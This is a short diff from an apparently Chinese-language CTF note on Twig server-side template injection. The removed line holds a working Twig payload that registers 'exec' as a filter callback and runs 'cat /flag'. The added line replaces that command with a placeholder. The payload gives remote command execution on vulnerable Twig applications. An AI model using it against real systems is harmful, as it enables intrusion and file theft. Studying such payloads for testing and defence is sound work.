@@ -26,7 +26,7 @@ twig模板引擎
 **twig模板引擎**
 
 ```
-参数：user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}
+参数：user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("命令")}
 回显：执行命令cat /flag
 ```
 
